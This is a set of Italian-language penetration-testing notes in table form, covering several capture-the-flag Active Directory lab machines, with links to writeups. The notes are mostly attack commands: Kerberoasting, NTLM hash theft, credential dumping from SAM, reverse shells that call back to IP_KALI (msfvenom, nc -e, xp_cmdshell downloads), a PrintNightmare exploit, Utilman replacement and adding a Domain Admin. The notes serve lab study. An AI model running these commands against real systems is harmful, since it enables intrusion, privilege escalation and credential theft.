| **WriteOwner**         | 1. ![[Pasted image 20250830210622.png]]<br>2. `bloodyAD -d sequel.htb --host IP_TARGET -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan`<br>3. `bloodyAD -d sequel.htb --host IP_TARGET -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan`<br>4. `certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip IP_TARGET` | Utilizziamo le credenziali trovate per enumerare la rete e caricare tutto su *BloodHound*.<br>Dalla *1.* scopriamo che l'utente `ryan` (di cui abbiamo la password), ha i permessi *WriteOwner* sull'utente `ca_svc`.<br>Utilizziamo la *2.*, *3.* e *4.* |
| **Template**           | 1. `certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip IP_TARGET -stdout`                                                                                                                                                                                                                                              | Cercando tra i template troviamo *Cert Publishers* che √® vulnerabile *ESC4*                                                                                                                                                                               |

- [writeup](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html#mssql-as-rose)

## SMB

### Enterprise

| **üß† Azione**             | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                                                                                           | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB**                   | 1. `find . -type f -name "*history*"`                                                                                                                                                                                                                                                                                                                                                                                           | Troviamo il servizio *SMB* accessibile con le credenzilai di default. Scarichiamo il contenuto della cartella Users in locale e poi applichiamo la *1.* per cercare file interessanti. Troviamo il file `Consolehost_history.txt` contenenti le credenziali `replication:101RepAdmin123!!`. Le credenziali trovate per√≤ non funzionano                                                      |
| **GitHub**                |                                                                                                                                                                                                                                                                                                                                                                                                                                 | Sul sito web si fa riferimento ad una sezione git, cercando sul web troviamo il seguente [documento](https://github.com/Nik-enterprise-dev/mgmtScript.ps1/blob/main/SystemInfo.ps1) contenente le credenziali `nik:ToastyBoi!`                                                                                                                                                              |
| **Kerberoastable**        | 1. `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP_TARGET -request`<br>2. `john hash --wordlist=rockyou.txt`<br>3. `xfreerdp /u:USER /p:PASS /v:IP_TARGET`                                                                                                                                                                                                                                                                     | Utilizziamo la *1.* per ottenere l'NTLM di altri utenti. Utilizziamo la *2.* per craccarlo                                                                                                                                                                                                                                                                                                  |
| **PowerUp.ps1**           | 1. `iwr http://IP_KALI/PowerUp.ps1 -OutFile C:\temp\PowerUp.ps1`<br>2. `Import-Module .\PowerUp.ps1`<br>3. `Invoke-AllChecks`                                                                                                                                                                                                                                                                                                   | Scarichiamo sulla macchina target con la *1.* [PowerUp.ps1](https://github.com/HarmJ0y/PowerUp) ed avviamolo con la *2.* e *3.*.                                                                                                                                                                                                                                                            |
| **Unquoted Service Path** | 1. `sc.exe qc zerotieroneservice`<br>2. `calcs 'C:\Program Files (x86)\Zero Tier\'`<br>3. *KALI:*`msfvenom -p windows/shell_reverse_tcp lhost=IP_KALI lport=1234 -f exe-service -o ZeroTier.exe`<br>4. *KALI:*`nc -lvnp 1234`<br>5. `iwr http://IP_KALI/ZeroTier.exe -OutFile 'C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe'`<br>6. `sc.exe stop zerotieroneservice`<br>7. `sc.exe start zerotieroneservice`<br> | Troviamo che il file `zerotieroneservice` √® vulnerabile a *Unquoted Service Path*. Controlliamo con la *1.* lo status, con la *2.* i permessi dell'utente sulla cartella (se sono in scrittura). Creiamo con la *3.* in locale una reverse shell che sostituisca il file `ZeroTier.exe`, scarichiamolo sul target con la *5.*, fermiamo il servizio con la *6.*,  e riavviamolo con la *7.* |

- [writeup](https://medium.com/@rizzziom/enterprise-walkthrough-tryhackme-9dad0f3bd998)


### Timelapse

| **üß† Azione**               | **üíª Comando Chiave**                                                                                                                                                                                             | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                   |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB**                     | 1. `smbclient //IP_TARGET/Shares`<br>2. `7z x winrm_backup.zip`<br>3. `zip2john winrm_backup.zip > hash`<br>4. `john hash --wordlist=rockyou.txt`                                                                 | Scopriamo che una cartella di SMB √® leggibile, applichiamo la *1.* per leggerla. Troviamo il file `winrm_backup.zip` che unzippiamo con la *2.* ma √® bloccato da password.<br>Cracchiamo la password con la *3.* e *4.*.                                                                                                |
| **Crack pfx file**          | 1. `pfx2john legacyy_dev_auth.pfx > hash`<br>2. `john hash --wordlist=rockyou.txt` <br>3. `openssl pkcs12 -in legacyy_dev_auth.pfx -info`<br>                                                                     | Tra i file estratti √® presente un `.pfx` che √® protetto da password, usiamo la *1.* e la *2.*. Con la *3.* estraiamo la chiave privata                                                                                                                                                                                  |
| **Winrm SSL**               | 1. `openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes`<br>2. `openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert`<br>3. `evil-winrm -c key.cert -k key.pem -i IP_TARGET -P 5986 -S` |                                                                                                                                                                                                                                                                                                                         |
| **ConsoleHost_history.txt** | 1. `evil-winrm -u svc_deploy -p 'PASS' -i IP_TARGET -S`                                                                                                                                                           | Troviamo il file ```C:\Users\legacyy\APPDATA\<br>roaming\Microsoft\Windows\<br>PowerShell\PSReadLine\<br>ConsoleHost_history.txt``` dove sono presenti comandi digitati precedentemente. Troviamo delle credenziali per l'utente `svc_deploy`. Entriamo con la *1.*                                                     |
| **LAPS Readers**            | 1. `net /user USER`<br>2. `Get-ADComputer -Filter ‚ÄòObjectClass -eq ‚Äúcomputer‚Äù‚Äô -Property *`                                                                                                                       | Utilizzando la *1.* scopriamo che l'utente fa parte del gruppo *LAPS_Readers* che √® vulnerabile secondo questo [articolo](https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1).<br>Utilizziamo la *2.* e troviamo le credenziali dell'amministratore |

- [writeup](https://medium.com/@pk2212/htb-timelapse-walkthrough-a1ef7e9e852a)


### Monteverde

| **üß† Azione**             | **üíª Comando Chiave**                                                                                                                                                          | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                   |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **RPC Usern enumeration** | 1. `rpcclient -N -U '' DOMAIN`<br>2. `enumdomusers`<br>3. `enumdomgroups`<br>4. `for proto in {smb,winrm,mssql,ldap}; do nxc $proto IP_TARGET -u users.txt -p users.txt; done` | Con la *1.*,*2.* e *3.* enumeriamo tutti gli utente presenti sulla macchina. Infine usiamo la *4.* per scoprire che le credenziali `SABatchJobs:SABatchJobs`                                                                                                                                                                                                            |
| **SMB**                   | 1. `for proto in {smb,winrm,mssql,ldap}; do nxc $proto IP_TARGET -u users.txt -p 4n0therD4y@n0th3r$; done`                                                                     | Le credenziali precedentemente trovate ci portano ad entrare nel servizio SMB dove troviamo un file contenente una password. Applicando la *1.* scopriamo che quella password √® associata all'utente `mhope`                                                                                                                                                            |
| **Group Azure Admins**    | 1. `upload Azure-ADConnect.ps1`<br>2. `import-module .\Azure-ADConnect.ps1`<br>3. `Azure-ADConnect -server 127.0.0.1 -db ADSync`                                               | L'utente `mhope` √® membro del gruppo *Azure Admins* che √® [vulnerabile](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1?source=post_page-----808ffe5cdded---------------------------------------).<br>Carichiamo il tool con la *1.*, importiamo i moduli con la *2.* ed otteniamo le credenziali dell'administrator con la *3.* |


- [writeup](https://medium.com/@qinncade/monteverde-htb-writeup-as-oscp-preparation-808ffe5cdded)

### Hokkaido

| üß† Azione             | üíª Comando Chiave                                                                                                                                                                                                                                                                                                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                                                    |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **User Enumeration**  | 1. `kerbrute  userenum -d hokkaido-aerospace.com --dc IP_TARGET /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100`                                                                                                                                                                                                                      | Notiamo la porta `88` aperta, dunque utilizziamo la *1.* per verificare gli utenti attivi sulla macchina target                                                                                                                                                                                      |
| **Password Spraying** | 1. `crackmapexec smb IP_TARGET  --shares -u users.txt -p pass.txt --continue-on-success`<br>2. `crackmapexec smb IP_TARGET -u users.txt -p Start123!  --continue-on-success`                                                                                                                                                                                           | Utilizziamo la *1.* e troviamo le credenziali `info:info`. Nella cartella condivisa `NETLOGON` *SMB* troviamo il file `password_reset.txt` contenente la password `Start123!`. Utilizziamo la *2.* per fare password spraying con la nuova password e troviamo le credenziali `discovery:Start123!`  |
| **Kerberoasting**     | 1. `impacket-GetUserSPNs -dc-ip IP_TARGET hokkaido-aerospace.com/discovery:Start123! -request`                                                                                                                                                                                                                                                                         | Con le credenziali valide facciamo kerberoasting con la *1.*, otteniamo due hash ma non risuciamo a craccarli                                                                                                                                                                                        |
| **MSSQL**             | 1. `impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@IP_TARGET -dc-ip IP_TARGET -windows-auth`<br>2. *TARGET* `SELECT name FROM master..sysdatabases;`<br>3. *TARGET* `EXECUTE AS LOGIN = 'hrappdb-reader'`<br>4. *TARGET* `use hrappdb`<br>5. *TARGET* `SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;`<br>6. *TARGET* `select * from sysauth;` | Poich√© notiamo dalla scansione esterna che il servizio *MSSQL* √® attivo sulla macchina, usiamo la *1.* per accedere con le credenziali valide                                                                                                                                                        |
| **BloodHound**        | 1. `bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns IP_TARGET`                                                                                                                                                                                                                                                      | Applichiamo la *1.* per ottenere la struttura dell'AD                                                                                                                                                                                                                                                |
| **Kerberoasting**     | 1. `targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip IP_KALI`<br>2. `john hash.txt --wordlist=rockyou.txt`                                                                                                                                                                                                           | Applichiamo del kerberoasting con la *1.*  ed otteniamo un hash che cracchiamo con la *2.* ottenendo le credenziali `hrapp.green:hazel1988`                                                                                                                                                          |
| **Change Password**   | 1. `rpcclient -N IP_TARGET -U 'hazel.green%haze1988'`<br>2. `setuserinfo2 MOLLY.SMITH 23 'Password123!'`<br>3. `xfreerdp /u:molly.smith /p:'PASS' /v:IP_TARGET +clipboard`                                                                                                                                                                                             | Dallo schema di bloodhound scopriamo che l'utente `hazel.green` ha il permesso di cambiare password sull'utente `MOLLY.SMITH`. Con la *1.* effettuiamo l'accesso e con la *2.* cambiamo la password dell'utente. Adesso possiamo effettuare l'accesso con la *3.*                                    |
| **SeBackupPrivilege** | 1. *TARGET* `whoami /all` <br>2. *TARGET* `reg save hklm\sam C:\Temp\sam`<br>3. *TARGET* `reg save hklm\system C:\Temp\system`<br>4. *KALI* `impacket-secretsdump -system -sam sam local`<br>5. *KALI* `evil-winrm -i IP_TARGET  -u administrator -H "d752482897d54e239376fddb2a2109e4"`                                                                               | Con la *1.* notiamo che abbiamo i permessi *SeBackupPrivilege* e questo ci permette di fare un privesc. Scarichiamo con la *2.* e la *3.* i file di sistema `sam` e `system` e con la *4.* otteniamo tutti gli hash degli utenti. Infine usiamo la *5.* per effettuare l'accesso come amministratore |


- [writeup](https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491)

### Vault

| üß† Azione              | üíª Comando Chiave                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                        |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **User Enumeration**   | 1. `crackmapexec smb IP_TARGET -u guest -p "" --rid-brute`                                                                                                    | Con la *1.* facciamo una enumerazione degli utenti e notiamo l'utente `anirudh`                                                                                                                                                                                                                                                                                                                                          |
| **NTLM Relay Attacks** | 1. `python3 ntlm_theft.py -g lnk -s IP_KALI -f vault`<br>2. `responder -I tun0`<br>3. `john hash --wordlist=rockyou.txt`                                      | Poich√© abbiamo l'accesso al servizio *SMB* come utente `guest` allora provo un NLTM Realy Attack con permessi di scrittura: scarichiamo [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft) ed utilizziamo la *1.* per creare un file malevolo da caricare, carichiamolo in *SMB* ed attiviamo il responder con la *2.*. <br>L'utente `anirudh` clicca sul file ed otteniamo il suo hash che cracchiamo con la *3.* |
| **SeRestorePrivilege** | 1. `mv C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.old`<br>2. `mv C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`<br>3. `CTRL+U` | Effettuiamo l'accesso con *WINRM* e notiamo che tra i permessi l'utente `anirudh` ha abilitato *SeRestorePrivilege* con cui possiamo riprendere file precedentemente eliminati.<br>Rimpiazziamo con la *1.* e *2.* il file `Utilman.exe` con `cmd.exe`. Adesso effettuiamo l'accesso con il servizio *RDP* e poi premiamo i tasti della *3.* per avviare una shell come utente amminsitratore                            |


- [writeup](https://r4j3sh.medium.com/offsec-vault-proving-grounds-practice-writeup-380915703a09)
## Ticket Silver Attacks

### Breach

| üß† Azione                | üíª Comando Chiave                                                                                                                                                                                                                                                                                                                                                                                                         | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **NTLM Hash Theft**      | 1. `netexec smb BREACDC.creach.vl -u 'guest' -p '' --shares`<br>2. `git clone https://github.com/Greenwolf/ntlm_theft`<br>3. `python3 ntlm_theft.py -g all -s IP_KALI -f NAME_OUTFILE`<br>4. *SMB* `recurse on`<br>5. *SMB* `prompt off`<br>6. *SMB* `mput *`<br>7. `responder -I tun0`                                                                                                                                   | Utilizziamo la *1.* per vedere le cartelle accessibili in samba con credenziali di default; notiamo che la cartella `/share` √® scrivibile. Deduciamo che se un utente naviga quella cartella allora possiamo rubargli l'NTLM Hash e craccarlo.<br>Con la *2.* scarichiamo il tool [ntlm theft](https://github.com/Greenwolf/ntlm_theft) e con la *3.* creiamo i file su cui l'utente dovrebbe cliccare per fars√¨ che si attivi. Infine carichiamo tutti i file con la *4.*,*5* e *6.*. Adesso applichiamo la *7.* per attivare il listener ed attendiamo.<br>                                                                                                                                                                                                                                                    |
| **Cracking**             | 1. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                                                                                                                                                                                                     | Abbiamo ottenuto l'NTLM Hash dell'utente `julia.wong`, adesso utilizziamo la *1.* per craccarlo.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **BloodHound**           | 1. `git clone https://github.com/dirkjanm/BloodHound.py.git`<br>2. `python3 BloodHound.py/bloodhound.py -d 'breach.vl' -u 'julia.wong' -p 'Computer1' -c all -ns IP_TARGET --zip`                                                                                                                                                                                                                                         | Adesso che abbiamo delle credenziali valide, possiamo utilizzarle per fare bloodhound. Utilizziamol a *1.* per scaricare e la *2.* per avviarlo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| **Kerberoasting**        | 1. `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP_TARGET -request`<br>2. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                                                                                                                             | Con le credenziali valide possiamo anche provare a fare kerberoasting con la *1.*. Otteniamo il ticket dell'utente di servizio `svc_mssql`. Cracchiamolo con la *2.* per ottenere la password `Trustno1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Ticket Silver Attack** | 1. `impacket-ticketer -nthash NTHASH -domain-sid SID -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Administrator`<br>2. `export KRB5CCNAME=Administrator.ccache`<br>3. `impacket-mssqlclient Administrator@BREACHDC.breach.vl -k -no-pass`<br>4. *MSSQL* `enable_xp_cmdshell`<br>5. *MSSQL* `xp_cmdshell curl http://IP_KALI/rev.ps1 -o c:\temp\rev.ps1`<br>6. *MSSQL* `xp_cmdshell powershell c:\temp\rev.ps1` | Provando ad entrare in remoto sulla porta `1433` su cui √® presente il servizio *MSSQL* notiamo che non abbiamo i privilegi per avviare una shell. Allora, poich√© siamo in possesso di un account di servizio, possiamo creare una Ticket Silver per l'utente `Administrator` ed effettuare l'accesso sulla stessa porta con quello cos√¨ da poter avviare una shell.<br>Utilizziamo la *1.* per creare il ticket. Per ottenere l'NTLM possiamo utilizzare un [NTLM calculator online](https://www.browserling.com/tools/ntlm-hash) (ci basta inserire la password in chiaro). Adesso applichiamo la *2.* per utilizzare il file `.ccache` appnea generato e la *3.* per accedere alla porta `1433`. Usiamo la *4.* per abilitare la shell sul servizio e la *5.* e *6.* per scaricare ed avviare la reverse shell |
| **Potato Attack**        | 1. `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`<br>2. `.\GodPotato-NET4.exe -cmd ".\nc64.exe IP_KALI 80 -e c:\windows\system32\cmd.exe"`                                                                                                                                                                                                                                                   | L'utente `apache` ha i permessi `SetImpersonatePrivilege`. Scopriamo con la *1.* se √® presente .NET. Poich√© √® presente .NET possiamo caricare [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) sulla macchina target ed avviarlo con la *2.*                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |

- [writeup](https://medium.com/@The_Hiker/breach-vulnlab-walkthrough-thehiker-86dcab8b619f)

## Bruteforcing

### Sweep

- [writeup](https://medium.com/@bericontraster/sweep-vulnlab-full-walkthrough-tjnull-list-994dd099c5e0)
  
  
  

### Reset

| üß† Azione                 | üíª Comando Chiave                                                                                                                                                                                                                                                                                                           | üìù Output / Scopo                                                                                                                                                                                                        |
| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **User enumeration**      | 1. `impacket-lookupsid thm.corp/guest@IP_TARGET`                                                                                                                                                                                                                                                                            | Cerchiamo di trovare per prima cosa degli utenti validi tramite *1.*                                                                                                                                                     |
| **SMB**                   | 1. `smbclient -L //IP_TARGET -N`<br>2. `smbclient //IP_TARGET/Data -N`                                                                                                                                                                                                                                                      | Tramite il servizio *SMB* troviamo un file contenente una password iniziale che √® `ResetMe123!`                                                                                                                          |
| **Password spraying**     | 1. `nxc smb IP_TARGET -u users.txt -p ResetMe123! --continue-on-success`                                                                                                                                                                                                                                                    | Adesso che abbiamo sia username e password proviamo password spraying                                                                                                                                                    |
| **Change SMB Password**   | 1. `python3 smbpasswd.py LILY_ONEILL@IP_TARGET`<br>2. `enum4linux -u thm.corp\\lily_oneill -p P@\$\$w0rd -a IP_TARGET`<br>3. `smbclient \\\\IP_TARGET\\Data -U thm.corp\\LILY_ONEILL`                                                                                                                                       | Con la *1.* cambiamo la password e con la *2.* e la *3.* effettuiamo l'accesso                                                                                                                                           |
| **ASREPRoast**            | 1. `impacket-GetNPUsers thm.corp/ -no-pass -usersfile CorpUsers.txt`<br>2. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                               | Con la *1.* troviamo l'hash NTLM e poi con al *2.* la cracchiamo.                                                                                                                                                        |
| **Login**                 | 1. `evil-winrm -i IP_TARGET -u TABATHA_BRITT -p marlboro(1985)`                                                                                                                                                                                                                                                             | Entriamo con la *1.*                                                                                                                                                                                                     |
| **Bloodhound**            | 1. `bloodhound -d thm.corp -u USER -p PASS -ns IP_TARGET -c all`                                                                                                                                                                                                                                                            | Utilizziamo la *1.* per utilizzare bloodhound                                                                                                                                                                            |
| **Generical All**         | 1. `Set-ADAccountPassword -Identity Shawna_Bray -Reset -NewPassword (ConvertTo-SecureString 'Password00' -AsPlainText -Force)`                                                                                                                                                                                              | Notiamo che l'account in nostro possesso ha i permessi *Generic All* sull'account `SHAWNA_BRAY`. Utilizziamo *1.* per cambiare la password all'utente                                                                    |
| **Force Change Password** | 1. `Set-ADAccountPassword -Identity Cruz_Hall -Reset -NewPassword (ConvertTo-SecureString 'Password00' -AsPlainText -Force)`<br>2. `Set-ADAccountPassword -Identity Darla_Winters -Reset -NewPassword (ConvertTo-SecureString 'Password00' -AsPlainText -Force)`                                                            | `SHAWNA_BRAY` ha i permessi *ForceChangePassword* sulla password dell'utente `CRUZ_HALL`                                                                                                                                 |
| **TGS RBCD**              | 1. `impacket-getST \`<br>  `-k \`<br>  `-impersonate Administrator \`<br>  `-spn cifs/HAYSTACK.THM.CORP \`<br>  `THM.CORP/DARLA_WINTERS`<br>  2. `export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache`<br>  3. `impacket-wmiexec \`<br>  `THM.CORP/Administrator@HAYSTACK.THM.CORP \`<br>  `-k -no-pass` | Estraiamo il ticket con la *1.*, impostiamolo come variabile d'ambiente con la *2.* ed infine utilizziamo il ticket con la *3.*<br><br>NB: in questa fase sfruttiamo RBCD ovvero la capacit√† di impersonare altri utenti |
| **Domain Admin**          | 1. `dsadd user "CN=Mishky,CN=Users,DC=thm,DC=corp" -samid Mishky -pwd Password00`<br>2. `net group "Domain Admins" Mishky /add /domain`<br>                                                                                                                                                                                 | Aggiungo al DC un nuovo account                                                                                                                                                                                          |


- [writeup](https://happycamper84.medium.com/tryhackme-reset-walkthrough-729586f9823c)
  
### Attacktive Directory

| üß† Azione          | üíª Comando Chiave                                                                                                                                                                    | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                   |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Kerberoasting**  | 1. `./kerbrute_linux_amd64 userenum --dc DOMAIN -d DOMAIN userlist.txt`                                                                                                              | Troviamo la porta `88` quindi possiamo fare enumerazione degli utenti utilizzando il tool [kerbrute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) come nella *1.*                                                                                                                                                        |
| **AS-REProasting** | 1. `impacket-GetNPUsers -no-pass -usersfile users spookysec.local/`<br>2. `hashcat -a0 -m 18200 hash passwordlist.txt`                                                               | Con le utenze trovate proviamo a fare AS-REProasting con la *1.*, questo consente a un attaccante di ottenere un messaggio cifrato con la chiave derivata dalla password dell‚Äôutente, che pu√≤ poi essere craccato offline.<br>L'hash ottenuto possiamo craccarlo con la *2.* per ottenere le credenziali `svc-admin:management2005` |
| **SMB**            | 1. `nxc smb IP_TARGET -u svc-admin -p "management2005" --shares`                                                                                                                     | Con le nuove credenziali proviamo a vedere cosa troviamo nella cartella samba con la *1.*. Troviamo un file con le seguenti credenziali `backup@spookysec.local:backup2517860`                                                                                                                                                      |
| **backup**         | 1. `impacket-secretsdump -target-ip IP_TARGET spookysec.local/backup:backup2517860@IP_TARGET`<br>2. `evil-winrm -i IP_TARGET -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'` | Poich√© l'account `backup` fa parte del gruppo `Backup Operators` e questi hanno accesso a file importanti come `sam` e `system`, possiamo utilizzare la *1.* per ottenere gli hash NTLM di tutti gli utenti presenti sulla macchina. Infine usiamo la *2.* per entrare come amministratore della macchina con l'NTLM                |

- [writeup](https://dasshounak.medium.com/tryhackme-attacktive-directory-writeup-2d7311778baa)


## Redis

### Vulnnet: Active

| **üß† Azione**                                | **üíª Comando Chiave**                                                                                                                                                                                                                                                                   | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                     |
| -------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Redis**                                    | 1. `redis-cli -h IP_TARGET`<br>2. `CONFIG GET *`<br>3. ![[Pasted image 20250806135807.png]]                                                                                                                                                                                             | Troviamo la porta 6379 aperta dove √® presente il servizio *Redis*. Entriamo senza password con la *1.* e listiamo le istanze attive con la *2.*. Notiamo dalla *3.* che √® attivo un utente                                                                                                                                                                                                |
| **NLTM by SMB**                              | 1. `responder -I tun 0`<br>2. `eval "dofile('//IP_KALI/test')" 0`<br>3. ![[Pasted image 20250806140649.png]]                                                                                                                                                                            | Con *Redis* possiamo provare a fare l'autenticazione su SMB richiamando la funzione `dofile()`. Utilizziamo la *1.* sulla nostra macchina per simulare un server SMB e la *2.* su *Redis* per fare richiesta. Dalla *3.* notiamo che abbiamo catturato l'NTLM dell'utente mentre tentava l'accesso                                                                                        |
| **Cracking**                                 | 1. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                                                                   | Incolliamo tutto l'output e cracchiamo con la *1.* per ottenere la password                                                                                                                                                                                                                                                                                                               |
| **SMB**                                      | 1. `nxc smb vulnnet.local -u 'USER' -p 'PASS' --shares`<br>2. `smbclient \\IP_TARGET\Enterprise-Share -U 'USER'`                                                                                                                                                                        | Con le credenziali appena ottenute dai due passaggi precedenti usiamole per fare l'accesso al servizio SMB con la *1.* ed effettuiamo l'accesso con la *2.* e scarichiamo tutto in locale                                                                                                                                                                                                 |
| **Reverse Shell**                            | 1. ![[Pasted image 20250806142011.png]]<br>2. `nc -lvnp 443`                                                                                                                                                                                                                            | Notiamo che al suo interno √® presente il file `PurgeIrrelevantData.ps1` che pu√≤ essere sovrascritto. Sostituiamolo con la [nishang reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) e modifichiamo l'ultima riga come nella *1.*. Attendiamo con la *2.*                                                                                |
| **PrintNightmare**<br><br>*PRIVESC MTEDOO 1* | 1. `Get-Service -Name *`<br>2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=443 -f dll > shell.dll`<br>3. `nc -lvnp 443`<br>4. `smbserver.py smb 'pwd' -smb2support`<br>5. `python3 CVE-2021-1675.py vulnnet.local/USER:PASS@IP_TARGET '\\IP_KALI\smb\shell.dll'`<br> | Enumerando i processi con la *1.* troviamo il `Spooler` che √® vulnerabile a [CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675). Applichiamo l'exploit nel seguente modo: creiamo la `.dll` con la *2.*, avviamo un server con la *4.* ed eseguiamo l'exploit con la *5.* mandando la richiesta per prendere il `.dll` appena creato                                                |
| **GPO Abuse**<br><br>*PRIVESC METODO 2*      | 1. `.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USER --GPOName "SECURITY-POL-VN"`<br>2. `gupdate /force`                                                                                                                                                                          | Utilizzando BloodHound notiamo che l'account in nostro possesso ha privilegi *GenericWrite* sul gruppo *Security-POL-VN GPO* ci√≤ significa che possiamo aggiungerlo al gruppo degli utenti amministratori. Carichiamo sulla macchina target `SharpGPOAbuse.exe` e poi utilizziamo la *1.* per aggiungere l'utente al gruppo amministratori. Utilizziamo la *2.* per aggiornare il sistema |

- [writeup](https://mosec0.medium.com/thm-vulnnet-active-writeup-26380df366a6)

## Relay Attacks

### Escape

| **üß† Azione**                             | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                                                                                                                     | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB**                                   | 1. `for proto in {smb,winrm,mssql,ldap}; do nxc $proto IP_TARGET -u USER -p PASS; done`<br>                                                                                                                                                                                                                                                                                                                                                               | Da una delle cartelle di SMB troviamo un file che cita delle credenziali di default `PublicUser:GuestUserCantWrite1`.<br>Proviamo la *1.* ma non otteniamo accessi<br>                                                                                                                                                                                                                                                                                                                                            |
